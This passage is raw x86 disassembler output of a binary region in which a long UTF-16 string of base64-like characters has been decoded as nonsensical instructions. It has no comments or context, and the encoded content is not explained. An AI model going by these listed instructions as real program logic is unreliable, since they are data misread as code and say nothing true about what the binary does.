  4093b9:	75 00                	jne    0x4093bb
  4093bb:	51                   	push   %ecx
  4093bc:	00 72 00             	add    %dh,0x0(%edx)
  4093bf:	54                   	push   %esp
  4093c0:	00 6b 00             	add    %ch,0x0(%ebx)
  4093c3:	32 00                	xor    (%eax),%al
  4093c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c6:	00 4e 00             	add    %cl,0x0(%esi)
  4093c9:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  4093cd:	31 00                	xor    %eax,(%eax)
  4093cf:	30 00                	xor    %al,(%eax)
  4093d1:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  4093d5:	72 00                	jb     0x4093d7
  4093d7:	54                   	push   %esp
  4093d8:	00 77 00             	add    %dh,0x0(%edi)
  4093db:	35 00 79 00 71       	xor    $0x71007900,%eax
  4093e0:	00 39                	add    %bh,(%ecx)
  4093e2:	00 45 00             	add    %al,0x0(%ebp)
  4093e5:	47                   	inc    %edi
  4093e6:	00 69 00             	add    %ch,0x0(%ecx)
  4093e9:	58                   	pop    %eax
  4093ea:	00 43 00             	add    %al,0x0(%ebx)
  4093ed:	52                   	push   %edx
  4093ee:	00 73 00             	add    %dh,0x0(%ebx)
  4093f1:	79 00                	jns    0x4093f3
  4093f3:	66 00 44 00 65       	data16 add %al,0x65(%eax,%eax,1)
  4093f8:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  4093fc:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  409400:	00 61 00             	add    %ah,0x0(%ecx)
  409403:	4b                   	dec    %ebx
  409404:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  409408:	00 31                	add    %dh,(%ecx)
  40940a:	00 4e 00             	add    %cl,0x0(%esi)
  40940d:	7a 00                	jp     0x40940f
  40940f:	5a                   	pop    %edx
  409410:	00 77 00             	add    %dh,0x0(%edi)
  409413:	6d                   	insl   (%dx),%es:(%edi)
  409414:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  409418:	00 34 00             	add    %dh,(%eax,%eax,1)
  40941b:	37                   	aaa
  40941c:	00 5a 00             	add    %bl,0x0(%edx)
  40941f:	4e                   	dec    %esi
  409420:	00 47 00             	add    %al,0x0(%edi)
  409423:	31 00                	xor    %eax,(%eax)
  409425:	33 00                	xor    (%eax),%eax
  409427:	39 00                	cmp    %eax,(%eax)
  409429:	39 00                	cmp    %eax,(%eax)
  40942b:	62 00                	bound  %eax,(%eax)
  40942d:	49                   	dec    %ecx
  40942e:	00 78 00             	add    %bh,0x0(%eax)
  409431:	4a                   	dec    %edx
  409432:	00 50 00             	add    %dl,0x0(%eax)
  409435:	6d                   	insl   (%dx),%es:(%edi)
  409436:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40943a:	00 32                	add    %dh,(%edx)
  40943c:	00 4a 00             	add    %cl,0x0(%edx)
  40943f:	70 00                	jo     0x409441
  409441:	44                   	inc    %esp
  409442:	00 5a 00             	add    %bl,0x0(%edx)
  409445:	49                   	dec    %ecx
  409446:	00 52 00             	add    %dl,0x0(%edx)
  409449:	6b 00 56             	imul   $0x56,(%eax),%eax
  40944c:	00 47 00             	add    %al,0x0(%edi)
  40944f:	6a 00                	push   $0x0
  409451:	39 00                	cmp    %eax,(%eax)
  409453:	4a                   	dec    %edx
  409454:	00 31                	add    %dh,(%ecx)
  409456:	00 38                	add    %bh,(%eax)
  409458:	00 34 00             	add    %dh,(%eax,%eax,1)
  40945b:	51                   	push   %ecx
  40945c:	00 4f 00             	add    %cl,0x0(%edi)
  40945f:	61                   	popa
  409460:	00 47 00             	add    %al,0x0(%edi)
  409463:	4e                   	dec    %esi
  409464:	00 61 00             	add    %ah,0x0(%ecx)
  409467:	63 00                	arpl   %eax,(%eax)
  409469:	48                   	dec    %eax
  40946a:	00 70 00             	add    %dh,0x0(%eax)
  40946d:	62 00                	bound  %eax,(%eax)
  40946f:	68 00 6d 00 64       	push   $0x64006d00
  409474:	00 37                	add    %dh,(%edi)
  409476:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40947a:	00 35 00 67 00 41    	add    %dh,0x41006700
  409480:	00 31                	add    %dh,(%ecx)
  409482:	00 4e 00             	add    %cl,0x0(%esi)
  409485:	47                   	inc    %edi
  409486:	00 31                	add    %dh,(%ecx)
  409488:	00 2f                	add    %ch,(%edi)
  40948a:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40948e:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  409492:	00 58 00             	add    %bl,0x0(%eax)
  409495:	34 00                	xor    $0x0,%al
  409497:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40949b:	57                   	push   %edi
  40949c:	00 45 00             	add    %al,0x0(%ebp)
  40949f:	75 00                	jne    0x4094a1
  4094a1:	35 00 66 00 7a       	xor    $0x7a006600,%eax
  4094a6:	00 73 00             	add    %dh,0x0(%ebx)
  4094a9:	32 00                	xor    (%eax),%al
  4094ab:	48                   	dec    %eax
  4094ac:	00 65 00             	add    %ah,0x0(%ebp)
  4094af:	79 00                	jns    0x4094b1
  4094b1:	2b 00                	sub    (%eax),%eax
  4094b3:	45                   	inc    %ebp
  4094b4:	00 70 00             	add    %dh,0x0(%eax)
  4094b7:	4a                   	dec    %edx
  4094b8:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  4094bc:	00 38                	add    %bh,(%eax)
  4094be:	00 4b 00             	add    %cl,0x0(%ebx)
  4094c1:	67 00 6c 00          	add    %ch,0x0(%si)
  4094c5:	46                   	inc    %esi
  4094c6:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  4094ca:	00 50 00             	add    %dl,0x0(%eax)
  4094cd:	59                   	pop    %ecx
  4094ce:	00 43 00             	add    %al,0x0(%ebx)
  4094d1:	79 00                	jns    0x4094d3
  4094d3:	48                   	dec    %eax
  4094d4:	00 47 00             	add    %al,0x0(%edi)
  4094d7:	4a                   	dec    %edx
  4094d8:	00 65 00             	add    %ah,0x0(%ebp)
  4094db:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  4094df:	57                   	push   %edi
  4094e0:	00 62 00             	add    %ah,0x0(%edx)
  4094e3:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4094e7:	5a                   	pop    %edx
  4094e8:	00 71 00             	add    %dh,0x0(%ecx)
  4094eb:	56                   	push   %esi
  4094ec:	00 4b 00             	add    %cl,0x0(%ebx)
  4094ef:	64 00 74 00 6d       	add    %dh,%fs:0x6d(%eax,%eax,1)
  4094f4:	00 31                	add    %dh,(%ecx)
  4094f6:	00 6e 00             	add    %ch,0x0(%esi)
  4094f9:	56                   	push   %esi
  4094fa:	00 66 00             	add    %ah,0x0(%esi)
  4094fd:	4a                   	dec    %edx
  4094fe:	00 72 00             	add    %dh,0x0(%edx)
  409501:	43                   	inc    %ebx
  409502:	00 77 00             	add    %dh,0x0(%edi)
  409505:	41                   	inc    %ecx
  409506:	00 4d 00             	add    %cl,0x0(%ebp)
  409509:	61                   	popa
  40950a:	00 68 00             	add    %ch,0x0(%eax)
  40950d:	59                   	pop    %ecx
  40950e:	00 31                	add    %dh,(%ecx)
  409510:	00 77 00             	add    %dh,0x0(%edi)
  409513:	6f                   	outsl  %ds:(%esi),(%dx)
  409514:	00 58 00             	add    %bl,0x0(%eax)
  409517:	36 00 44 00 48       	add    %al,%ss:0x48(%eax,%eax,1)
  40951c:	00 7a 00             	add    %bh,0x0(%edx)
  40951f:	35 00 4b 00 4d       	xor    $0x4d004b00,%eax
  409524:	00 4e 00             	add    %cl,0x0(%esi)
  409527:	46                   	inc    %esi
  409528:	00 34 00             	add    %dh,(%eax,%eax,1)
  40952b:	35 00 56 00 4c       	xor    $0x4c005600,%eax
  409530:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  409534:	00 46 00             	add    %al,0x0(%esi)
  409537:	42                   	inc    %edx
  409538:	00 50 00             	add    %dl,0x0(%eax)
  40953b:	30 00                	xor    %al,(%eax)
  40953d:	59                   	pop    %ecx
  40953e:	00 47 00             	add    %al,0x0(%edi)
  409541:	50                   	push   %eax
  409542:	00 63 00             	add    %ah,0x0(%ebx)
  409545:	30 00                	xor    %al,(%eax)
  409547:	30 00                	xor    %al,(%eax)
  409549:	6b 00 53             	imul   $0x53,(%eax),%eax
  40954c:	00 2f                	add    %ch,(%edi)
  40954e:	00 65 00             	add    %ah,0x0(%ebp)
  409551:	52                   	push   %edx
  409552:	00 63 00             	add    %ah,0x0(%ebx)
  409555:	6a 00                	push   $0x0
  409557:	48                   	dec    %eax
  409558:	00 4d 00             	add    %cl,0x0(%ebp)
  40955b:	4c                   	dec    %esp
  40955c:	00 2b                	add    %ch,(%ebx)
  40955e:	00 58 00             	add    %bl,0x0(%eax)
  409561:	4c                   	dec    %esp
  409562:	00 2b                	add    %ch,(%ebx)
  409564:	00 38                	add    %bh,(%eax)
  409566:	00 69 00             	add    %ch,0x0(%ecx)
  409569:	37                   	aaa
  40956a:	00 32                	add    %dh,(%edx)
  40956c:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  409570:	00 76 00             	add    %dh,0x0(%esi)
  409573:	46                   	inc    %esi
  409574:	00 75 00             	add    %dh,0x0(%ebp)
  409577:	55                   	push   %ebp
  409578:	00 39                	add    %bh,(%ecx)
  40957a:	00 58 00             	add    %bl,0x0(%eax)
  40957d:	31 00                	xor    %eax,(%eax)
  40957f:	63 00                	arpl   %eax,(%eax)
  409581:	55                   	push   %ebp
  409582:	00 49 00             	add    %cl,0x0(%ecx)
  409585:	72 00                	jb     0x409587
  409587:	37                   	aaa
  409588:	00 61 00             	add    %ah,0x0(%ecx)
  40958b:	37                   	aaa
  40958c:	00 76 00             	add    %dh,0x0(%esi)
  40958f:	61                   	popa
  409590:	00 77 00             	add    %dh,0x0(%edi)
  409593:	62 00                	bound  %eax,(%eax)
  409595:	31 00                	xor    %eax,(%eax)
  409597:	72 00                	jb     0x409599
  409599:	4a                   	dec    %edx
  40959a:	00 50 00             	add    %dl,0x0(%eax)
  40959d:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  4095a1:	4f                   	dec    %edi
  4095a2:	00 71 00             	add    %dh,0x0(%ecx)
  4095a5:	32 00                	xor    (%eax),%al
  4095a7:	6a 00                	push   $0x0
  4095a9:	4e                   	dec    %esi
  4095aa:	00 53 00             	add    %dl,0x0(%ebx)
  4095ad:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  4095b1:	45                   	inc    %ebp
  4095b2:	00 62 00             	add    %ah,0x0(%edx)
  4095b5:	49                   	dec    %ecx
  4095b6:	00 6b 00             	add    %ch,0x0(%ebx)
  4095b9:	47                   	inc    %edi
  4095ba:	00 36                	add    %dh,(%esi)
  4095bc:	00 53 00             	add    %dl,0x0(%ebx)
  4095bf:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  4095c3:	32 00                	xor    (%eax),%al
  4095c5:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  4095c9:	33 00                	xor    (%eax),%eax
  4095cb:	65 00 35 00 6f 00 5a 	add    %dh,%gs:0x5a006f00
  4095d2:	00 6b 00             	add    %ch,0x0(%ebx)
  4095d5:	77 00                	ja     0x4095d7
  4095d7:	75 00                	jne    0x4095d9
  4095d9:	47                   	inc    %edi
  4095da:	00 4f 00             	add    %cl,0x0(%edi)
  4095dd:	50                   	push   %eax
  4095de:	00 52 00             	add    %dl,0x0(%edx)
  4095e1:	6b 00 73             	imul   $0x73,(%eax),%eax
  4095e4:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  4095e8:	00 2b                	add    %ch,(%ebx)
  4095ea:	00 63 00             	add    %ah,0x0(%ebx)
  4095ed:	51                   	push   %ecx
  4095ee:	00 7a 00             	add    %bh,0x0(%edx)
  4095f1:	34 00                	xor    $0x0,%al
  4095f3:	68 00 33 00 71       	push   $0x71003300
  4095f8:	00 57 00             	add    %dl,0x0(%edi)
  4095fb:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  4095ff:	4f                   	dec    %edi
  409600:	00 43 00             	add    %al,0x0(%ebx)
  409603:	41                   	inc    %ecx
  409604:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  409608:	00 62 00             	add    %ah,0x0(%edx)
  40960b:	52                   	push   %edx
  40960c:	00 4a 00             	add    %cl,0x0(%edx)
  40960f:	59                   	pop    %ecx
  409610:	00 7a 00             	add    %bh,0x0(%edx)
  409613:	32 00                	xor    (%eax),%al
  409615:	45                   	inc    %ebp
  409616:	00 66 00             	add    %ah,0x0(%esi)
  409619:	58                   	pop    %eax
  40961a:	00 70 00             	add    %dh,0x0(%eax)
  40961d:	37                   	aaa
  40961e:	00 7a 00             	add    %bh,0x0(%edx)
  409621:	4e                   	dec    %esi
  409622:	00 69 00             	add    %ch,0x0(%ecx)
  409625:	73 00                	jae    0x409627
  409627:	59                   	pop    %ecx
  409628:	00 37                	add    %dh,(%edi)
  40962a:	00 48 00             	add    %cl,0x0(%eax)
  40962d:	75 00                	jne    0x40962f
  40962f:	71 00                	jno    0x409631
  409631:	33 00                	xor    (%eax),%eax
  409633:	2b 00                	sub    (%eax),%eax
  409635:	73 00                	jae    0x409637
  409637:	4b                   	dec    %ebx
  409638:	00 42 00             	add    %al,0x0(%edx)
  40963b:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40963f:	55                   	push   %ebp
  409640:	00 6a 00             	add    %ch,0x0(%edx)
  409643:	44                   	inc    %esp
  409644:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  409648:	00 77 00             	add    %dh,0x0(%edi)
  40964b:	57                   	push   %edi
  40964c:	00 62 00             	add    %ah,0x0(%edx)
  40964f:	2f                   	das
  409650:	00 72 00             	add    %dh,0x0(%edx)
  409653:	6c                   	insb   (%dx),%es:(%edi)
  409654:	00 73 00             	add    %dh,0x0(%ebx)
  409657:	57                   	push   %edi
  409658:	00 63 00             	add    %ah,0x0(%ebx)
  40965b:	49                   	dec    %ecx
  40965c:	00 59 00             	add    %bl,0x0(%ecx)
  40965f:	6c                   	insb   (%dx),%es:(%edi)
  409660:	00 4f 00             	add    %cl,0x0(%edi)
  409663:	70 00                	jo     0x409665
  409665:	72 00                	jb     0x409667
  409667:	51                   	push   %ecx
  409668:	00 73 00             	add    %dh,0x0(%ebx)
  40966b:	30 00                	xor    %al,(%eax)
  40966d:	38 00                	cmp    %al,(%eax)
  40966f:	35 00 58 00 56       	xor    $0x56005800,%eax
  409674:	00 58 00             	add    %bl,0x0(%eax)
  409677:	4b                   	dec    %ebx
  409678:	00 36                	add    %dh,(%esi)
  40967a:	00 4b 00             	add    %cl,0x0(%ebx)
  40967d:	6d                   	insl   (%dx),%es:(%edi)
  40967e:	00 62 00             	add    %ah,0x0(%edx)
  409681:	35 00 68 00 4c       	xor    $0x4c006800,%eax
  409686:	00 50 00             	add    %dl,0x0(%eax)
  409689:	43                   	inc    %ebx
  40968a:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40968e:	00 39                	add    %bh,(%ecx)
  409690:	00 65 00             	add    %ah,0x0(%ebp)
  409693:	48                   	dec    %eax
  409694:	00 32                	add    %dh,(%edx)
  409696:	00 76 00             	add    %dh,0x0(%esi)
  409699:	45                   	inc    %ebp
  40969a:	00 51 00             	add    %dl,0x0(%ecx)
  40969d:	39 00                	cmp    %eax,(%eax)
  40969f:	62 00                	bound  %eax,(%eax)
  4096a1:	61                   	popa
  4096a2:	00 48 00             	add    %cl,0x0(%eax)
  4096a5:	49                   	dec    %ecx
  4096a6:	00 78 00             	add    %bh,0x0(%eax)
  4096a9:	31 00                	xor    %eax,(%eax)
  4096ab:	58                   	pop    %eax
  4096ac:	00 65 00             	add    %ah,0x0(%ebp)
  4096af:	73 00                	jae    0x4096b1
  4096b1:	4b                   	dec    %ebx
  4096b2:	00 62 00             	add    %ah,0x0(%edx)
  4096b5:	56                   	push   %esi
  4096b6:	00 59 00             	add    %bl,0x0(%ecx)
  4096b9:	4a                   	dec    %edx
  4096ba:	00 6e 00             	add    %ch,0x0(%esi)
  4096bd:	30 00                	xor    %al,(%eax)
  4096bf:	34 00                	xor    $0x0,%al
  4096c1:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  4096c5:	35 00 77 00 5a       	xor    $0x5a007700,%eax
  4096ca:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  4096ce:	00 6f 00             	add    %ch,0x0(%edi)
  4096d1:	46                   	inc    %esi
  4096d2:	00 7a 00             	add    %bh,0x0(%edx)
  4096d5:	43                   	inc    %ebx
  4096d6:	00 39                	add    %bh,(%ecx)
  4096d8:	00 49 00             	add    %cl,0x0(%ecx)
  4096db:	6a 00                	push   $0x0
  4096dd:	48                   	dec    %eax
  4096de:	00 76 00             	add    %dh,0x0(%esi)
  4096e1:	37                   	aaa
  4096e2:	00 72 00             	add    %dh,0x0(%edx)
  4096e5:	4f                   	dec    %edi
  4096e6:	00 71 00             	add    %dh,0x0(%ecx)
  4096e9:	44                   	inc    %esp
  4096ea:	00 32                	add    %dh,(%edx)
  4096ec:	00 70 00             	add    %dh,0x0(%eax)
  4096ef:	56                   	push   %esi
  4096f0:	00 4b 00             	add    %cl,0x0(%ebx)
  4096f3:	34 00                	xor    $0x0,%al
  4096f5:	4f                   	dec    %edi
  4096f6:	00 69 00             	add    %ch,0x0(%ecx)
  4096f9:	77 00                	ja     0x4096fb
  4096fb:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  4096ff:	42                   	inc    %edx
  409700:	00 33                	add    %dh,(%ebx)
  409702:	00 2f                	add    %ch,(%edi)
  409704:	00 59 00             	add    %bl,0x0(%ecx)
  409707:	43                   	inc    %ebx
  409708:	00 46 00             	add    %al,0x0(%esi)
  40970b:	43                   	inc    %ebx
  40970c:	00 68 00             	add    %ch,0x0(%eax)
  40970f:	57                   	push   %edi
  409710:	00 79 00             	add    %bh,0x0(%ecx)
  409713:	34 00                	xor    $0x0,%al
  409715:	56                   	push   %esi
  409716:	00 46 00             	add    %al,0x0(%esi)
  409719:	58                   	pop    %eax
  40971a:	00 6e 00             	add    %ch,0x0(%esi)
  40971d:	4f                   	dec    %edi
  40971e:	00 48 00             	add    %cl,0x0(%eax)
  409721:	77 00                	ja     0x409723
  409723:	51                   	push   %ecx
  409724:	00 77 00             	add    %dh,0x0(%edi)
  409727:	4f                   	dec    %edi
  409728:	00 61 00             	add    %ah,0x0(%ecx)
  40972b:	4a                   	dec    %edx
  40972c:	00 5a 00             	add    %bl,0x0(%edx)
  40972f:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  409733:	65 00 2b             	add    %ch,%gs:(%ebx)
  409736:	00 6a 00             	add    %ch,0x0(%edx)
  409739:	5a                   	pop    %edx
  40973a:	00 42 00             	add    %al,0x0(%edx)
  40973d:	63 00                	arpl   %eax,(%eax)
  40973f:	7a 00                	jp     0x409741
  409741:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  409745:	57                   	push   %edi
  409746:	00 4d 00             	add    %cl,0x0(%ebp)
  409749:	30 00                	xor    %al,(%eax)
  40974b:	47                   	inc    %edi
  40974c:	00 62 00             	add    %ah,0x0(%edx)
  40974f:	31 00                	xor    %eax,(%eax)
  409751:	2b 00                	sub    (%eax),%eax
  409753:	77 00                	ja     0x409755
  409755:	7a 00                	jp     0x409757
  409757:	30 00                	xor    %al,(%eax)
  409759:	5a                   	pop    %edx
  40975a:	00 6a 00             	add    %ch,0x0(%edx)
  40975d:	75 00                	jne    0x40975f
  40975f:	61                   	popa
  409760:	00 73 00             	add    %dh,0x0(%ebx)
  409763:	72 00                	jb     0x409765
  409765:	50                   	push   %eax
  409766:	00 75 00             	add    %dh,0x0(%ebp)
  409769:	34 00                	xor    $0x0,%al
  40976b:	33 00                	xor    (%eax),%eax
  40976d:	4e                   	dec    %esi
  40976e:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409772:	00 35 00 5a 00 65    	add    %dh,0x65005a00
  409778:	00 35 00 77 00 30    	add    %dh,0x30007700
  40977e:	00 45 00             	add    %al,0x0(%ebp)
  409781:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  409785:	5a                   	pop    %edx
  409786:	00 32                	add    %dh,(%edx)
  409788:	00 65 00             	add    %ah,0x0(%ebp)
  40978b:	75 00                	jne    0x40978d
  40978d:	63 00                	arpl   %eax,(%eax)
  40978f:	4e                   	dec    %esi
  409790:	00 36                	add    %dh,(%esi)
  409792:	00 2b                	add    %ch,(%ebx)
  409794:	00 2b                	add    %ch,(%ebx)
  409796:	00 52 00             	add    %dl,0x0(%edx)
  409799:	78 00                	js     0x40979b
  40979b:	4c                   	dec    %esp
  40979c:	00 68 00             	add    %ch,0x0(%eax)
  40979f:	79 00                	jns    0x4097a1
  4097a1:	4b                   	dec    %ebx
  4097a2:	00 55 00             	add    %dl,0x0(%ebp)
  4097a5:	49                   	dec    %ecx
  4097a6:	00 58 00             	add    %bl,0x0(%eax)
  4097a9:	54                   	push   %esp
  4097aa:	00 33                	add    %dh,(%ebx)
  4097ac:	00 77 00             	add    %dh,0x0(%edi)
  4097af:	51                   	push   %ecx
  4097b0:	00 30                	add    %dh,(%eax)
  4097b2:	00 35 00 7a 00 41    	add    %dh,0x41007a00
  4097b8:	00 69 00             	add    %ch,0x0(%ecx)
  4097bb:	38 00                	cmp    %al,(%eax)
  4097bd:	6c                   	insb   (%dx),%es:(%edi)
  4097be:	00 7a 00             	add    %bh,0x0(%edx)
  4097c1:	52                   	push   %edx
  4097c2:	00 76 00             	add    %dh,0x0(%esi)
  4097c5:	2f                   	das
  4097c6:	00 66 00             	add    %ah,0x0(%esi)
  4097c9:	4a                   	dec    %edx
  4097ca:	00 4a 00             	add    %cl,0x0(%edx)
  4097cd:	41                   	inc    %ecx
  4097ce:	00 68 00             	add    %ch,0x0(%eax)
  4097d1:	51                   	push   %ecx
  4097d2:	00 75 00             	add    %dh,0x0(%ebp)
  4097d5:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  4097d9:	4c                   	dec    %esp
  4097da:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  4097de:	00 38                	add    %bh,(%eax)
  4097e0:	00 31                	add    %dh,(%ecx)
  4097e2:	00 66 00             	add    %ah,0x0(%esi)
  4097e5:	44                   	inc    %esp
  4097e6:	00 4d 00             	add    %cl,0x0(%ebp)
  4097e9:	49                   	dec    %ecx
  4097ea:	00 66 00             	add    %ah,0x0(%esi)
  4097ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ee:	00 38                	add    %bh,(%eax)
  4097f0:	00 39                	add    %bh,(%ecx)
  4097f2:	00 6b 00             	add    %ch,0x0(%ebx)
  4097f5:	2b 00                	sub    (%eax),%eax
  4097f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f8:	00 48 00             	add    %cl,0x0(%eax)
  4097fb:	4d                   	dec    %ebp
  4097fc:	00 7a 00             	add    %bh,0x0(%edx)
  4097ff:	62 00                	bound  %eax,(%eax)
  409801:	37                   	aaa
  409802:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409806:	00 76 00             	add    %dh,0x0(%esi)
  409809:	5a                   	pop    %edx
  40980a:	00 30                	add    %dh,(%eax)
  40980c:	00 52 00             	add    %dl,0x0(%edx)
  40980f:	31 00                	xor    %eax,(%eax)
  409811:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  409815:	35 00 78 00 30       	xor    $0x30007800,%eax
  40981a:	00 53 00             	add    %dl,0x0(%ebx)
  40981d:	58                   	pop    %eax
  40981e:	00 36                	add    %dh,(%esi)
  409820:	00 66 00             	add    %ah,0x0(%esi)
  409823:	42                   	inc    %edx
  409824:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  409828:	00 57 00             	add    %dl,0x0(%edi)
  40982b:	46                   	inc    %esi
  40982c:	00 46 00             	add    %al,0x0(%esi)
  40982f:	6e                   	outsb  %ds:(%esi),(%dx)
  409830:	00 4f 00             	add    %cl,0x0(%edi)
  409833:	34 00                	xor    $0x0,%al
  409835:	38 00                	cmp    %al,(%eax)
  409837:	63 00                	arpl   %eax,(%eax)
  409839:	57                   	push   %edi
  40983a:	00 73 00             	add    %dh,0x0(%ebx)
  40983d:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  409841:	4a                   	dec    %edx
  409842:	00 70 00             	add    %dh,0x0(%eax)
  409845:	46                   	inc    %esi
  409846:	00 69 00             	add    %ch,0x0(%ecx)
  409849:	4a                   	dec    %edx
  40984a:	00 4d 00             	add    %cl,0x0(%ebp)
  40984d:	72 00                	jb     0x40984f
  40984f:	76 00                	jbe    0x409851
  409851:	48                   	dec    %eax
  409852:	00 57 00             	add    %dl,0x0(%edi)
  409855:	39 00                	cmp    %eax,(%eax)
  409857:	56                   	push   %esi
  409858:	00 46 00             	add    %al,0x0(%esi)
  40985b:	5a                   	pop    %edx
  40985c:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  409860:	00 59 00             	add    %bl,0x0(%ecx)
  409863:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  409867:	2f                   	das
  409868:	00 56 00             	add    %dl,0x0(%esi)
  40986b:	64 00 6c 00 6d       	add    %ch,%fs:0x6d(%eax,%eax,1)
  409870:	00 50 00             	add    %dl,0x0(%eax)
  409873:	4d                   	dec    %ebp
  409874:	00 69 00             	add    %ch,0x0(%ecx)
  409877:	31 00                	xor    %eax,(%eax)
  409879:	5a                   	pop    %edx
  40987a:	00 36                	add    %dh,(%esi)
  40987c:	00 61 00             	add    %ah,0x0(%ecx)
  40987f:	6e                   	outsb  %ds:(%esi),(%dx)
  409880:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  409884:	00 32                	add    %dh,(%edx)
  409886:	00 5a 00             	add    %bl,0x0(%edx)
  409889:	69 00 45 00 63 00    	imul   $0x630045,(%eax),%eax
  40988f:	5a                   	pop    %edx
  409890:	00 43 00             	add    %al,0x0(%ebx)
  409893:	2b 00                	sub    (%eax),%eax
  409895:	2b 00                	sub    (%eax),%eax
  409897:	79 00                	jns    0x409899
  409899:	6f                   	outsl  %ds:(%esi),(%dx)
  40989a:	00 55 00             	add    %dl,0x0(%ebp)
  40989d:	37                   	aaa
  40989e:	00 45 00             	add    %al,0x0(%ebp)
  4098a1:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  4098a5:	31 00                	xor    %eax,(%eax)
  4098a7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4098ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ac:	00 76 00             	add    %dh,0x0(%esi)
  4098af:	72 00                	jb     0x4098b1
  4098b1:	32 00                	xor    (%eax),%al
  4098b3:	44                   	inc    %esp
  4098b4:	00 33                	add    %dh,(%ebx)
  4098b6:	00 77 00             	add    %dh,0x0(%edi)
  4098b9:	49                   	dec    %ecx
  4098ba:	00 50 00             	add    %dl,0x0(%eax)
  4098bd:	33 00                	xor    (%eax),%eax
  4098bf:	4e                   	dec    %esi
  4098c0:	00 76 00             	add    %dh,0x0(%esi)
  4098c3:	6d                   	insl   (%dx),%es:(%edi)
  4098c4:	00 7a 00             	add    %bh,0x0(%edx)
  4098c7:	53                   	push   %ebx
  4098c8:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  4098cc:	00 39                	add    %bh,(%ecx)
  4098ce:	00 56 00             	add    %dl,0x0(%esi)
  4098d1:	39 00                	cmp    %eax,(%eax)
  4098d3:	35 00 5a 00 4e       	xor    $0x4e005a00,%eax
  4098d8:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  4098dc:	00 69 00             	add    %ch,0x0(%ecx)
  4098df:	52                   	push   %edx
  4098e0:	00 6d 00             	add    %ch,0x0(%ebp)
  4098e3:	6c                   	insb   (%dx),%es:(%edi)
  4098e4:	00 32                	add    %dh,(%edx)
  4098e6:	00 75 00             	add    %dh,0x0(%ebp)
  4098e9:	48                   	dec    %eax
  4098ea:	00 69 00             	add    %ch,0x0(%ecx)
  4098ed:	56                   	push   %esi
  4098ee:	00 61 00             	add    %ah,0x0(%ecx)
  4098f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f2:	00 53 00             	add    %dl,0x0(%ebx)
  4098f5:	59                   	pop    %ecx
  4098f6:	00 6a 00             	add    %ch,0x0(%edx)
  4098f9:	72 00                	jb     0x4098fb
  4098fb:	59                   	pop    %ecx
  4098fc:	00 38                	add    %bh,(%eax)
  4098fe:	00 36                	add    %dh,(%esi)
  409900:	00 4f 00             	add    %cl,0x0(%edi)
  409903:	72 00                	jb     0x409905
  409905:	33 00                	xor    (%eax),%eax
  409907:	79 00                	jns    0x409909
  409909:	78 00                	js     0x40990b
  40990b:	75 00                	jne    0x40990d
  40990d:	61                   	popa
  40990e:	00 45 00             	add    %al,0x0(%ebp)
  409911:	78 00                	js     0x409913
  409913:	47                   	inc    %edi
  409914:	00 57 00             	add    %dl,0x0(%edi)
  409917:	63 00                	arpl   %eax,(%eax)
  409919:	6e                   	outsb  %ds:(%esi),(%dx)
  40991a:	00 2f                	add    %ch,(%edi)
  40991c:	00 75 00             	add    %dh,0x0(%ebp)
  40991f:	45                   	inc    %ebp
  409920:	00 55 00             	add    %dl,0x0(%ebp)
  409923:	6a 00                	push   $0x0
  409925:	4c                   	dec    %esp
  409926:	00 73 00             	add    %dh,0x0(%ebx)
  409929:	6b 00 57             	imul   $0x57,(%eax),%eax
  40992c:	00 49 00             	add    %cl,0x0(%ecx)
  40992f:	6a 00                	push   $0x0
  409931:	73 00                	jae    0x409933
  409933:	76 00                	jbe    0x409935
  409935:	6c                   	insb   (%dx),%es:(%edi)
